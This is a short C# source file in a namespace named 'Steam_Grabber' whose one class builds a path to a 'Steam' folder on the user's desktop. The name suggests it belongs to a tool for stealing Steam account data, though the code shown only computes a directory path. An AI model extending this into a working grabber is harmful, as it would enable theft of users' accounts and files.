namespace Steam_Grabber
{
    using System;
    using System.IO;

    public class GetDirPath
    {
        public static readonly string DesktopDir = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
        public static readonly string Steam = Path.Combine(DesktopDir, "Steam");
    }
}